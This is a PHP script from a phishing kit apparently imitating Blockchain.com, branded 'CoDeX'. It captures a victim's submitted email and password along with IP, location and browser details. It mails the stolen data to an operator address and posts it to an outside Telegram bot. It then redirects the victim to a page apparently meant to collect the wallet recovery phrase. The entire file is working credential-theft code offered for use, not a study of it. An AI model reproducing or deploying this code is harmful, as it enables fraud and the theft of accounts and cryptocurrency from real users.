<?php
/*

*/

error_reporting(0);

@session_start();

$get_sessionid = $_GET["SESSION"];
//echo $get_sessionid;

// Retrive Session
$get_sess = $_SESSION["sess_id"];
session_id($get_sess);

$_SESSION["email"] = $_POST["email"];
$_SESSION["pass"] = $_POST["pass"];


$ip		= $_SERVER['REMOTE_ADDR'];
require "../includes/blocker1.php"; // ITS REQURED EVERY PAGE

// Check Session
if ($get_sessionid !== $get_sess) {
	print '
	<html><head>
	<title>403 - Forbidden</title>
	</head><body>
	<h1>403 Forbidden</h1>
	</p></p>
	<hr>
	</body></html>
	';
	exit();
}
/*
* Saving Info
*/
function saveResultz() {
	$notirput = getenv("REMOTE_ADDR");
	
$user_ids = trim(file_get_contents("../admin/config/email.ini"));
$telegram = trim(file_get_contents("../admin/config/status_telegram.ini"));
$chatId = trim(file_get_contents("../admin/config/chatId.ini"));
$botUrl = trim(file_get_contents("../admin/config/botUrl.ini"));

$InfoDATE   = date("d-m-Y h:i:sa");

	include('../includes/geoip.php');	
	include('detect.php');
	include('system.php');
	require "../includes/blocker1.php";

	$_SESSION["country"] = ip_info($notirput, "Country Code");

/*
* GET DOMAIN NAME
*/
  if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') 
      $link = "https"; 
  else
      $link = "http"; 
  $link .= "://"; 
  $link .= $_SERVER['HTTP_HOST']; 
  $link .= $_SERVER['REQUEST_URI']; 
  $fullurl = $link;

  $url = $fullurl;
  $parse = parse_url($url);
  $getDomain = $parse['host'];

	$message .= "++++++++++++++🌐 CoDeX@BLOCK.CHAIN EMAILACCESS INFO  🌐++++++++++++++\n";	
	$message .= "Email 	    : ".$_SESSION["email"]."\n";
	$message .= "PassWord   : ".$_SESSION["pass"]."\n";		
	$message .= "++++++++++++++🌐 CoDeX@BLOCK.CHAIN IP INFO 🌐++++++++++++++\n";
	$message .= "IP       : $notirput\n";
	$message .= "Country       : $countryname\n";
	$message .= "City       : $countrycity\n";
	$message .= "Time       : $InfoDATE\n";
	$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
	$message .= "++++++++++++++🌐 CoDeX@BLOCK.CHAIN IP INFO 🌐++++++++++++++\n";

	$subject = "NEW BLOCK.CHAIN EMAILACCESS INFO FROM [" . $notirput . "] [$countrycode]";
	$headers = "From: 💎 C0DeX 💎 <result@codex.com>";
	mail($user_ids,$subject,$message,$headers);

// Telegram send function
$txt = $message;
if ($telegram == "on"){
    $send = ['chat_id'=>$chatId,'text'=>$txt];
    $web_telegram = "https://api.telegram.org/{$botUrl}";
    $ch = curl_init($web_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}


}

	
	saveResultz();


//Set Refresh header using PHP.
header( "refresh:0;url=../phrase.php?SESSION=$get_sess" );
?>